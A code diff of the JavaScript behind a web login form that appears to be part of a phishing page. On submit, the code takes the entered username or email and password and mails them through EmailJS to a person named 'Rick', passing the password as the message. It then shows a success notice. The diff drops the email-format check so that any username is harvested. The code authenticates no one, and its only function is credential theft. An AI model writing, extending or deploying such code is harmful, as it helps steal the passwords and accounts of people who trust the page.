@@ -3,36 +3,29 @@
 })();
 
 function validate() {
-  let email = document.querySelector(".email");
+  let usename = document.querySelector(".email");
   let password = document.querySelector(".password");
   let btn = document.querySelector(".submit");
 
   btn.addEventListener("click", (e) => {
     e.preventDefault();
     //validate email
-    let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
-    if (email.value.match(regexEmail)) {
-      if (email.value === "" || password.value === "") {
-        emptyerror();
-      } else {
-        sendmail(email.value, password.value);
-        email.value = "";
-        password.value = "";
-        success();
-      }
+    if (usename.value === "" || password.value === "") {
+      emptyerror();
     } else {
-      error();
-      email.value = "";
+      sendmail(usename.value, password.value);
+      usename.value = "";
       password.value = "";
+      success();
     }
   });
 }
 validate();
 
-function sendmail(email, password) {
+function sendmail(usename, password) {
   emailjs.send("service_ll5oava", "template_cvjri3e", {
     to_name: "Rick",
-    from_name: email,
+    from_name: usename,
     message: password,
   });
 }
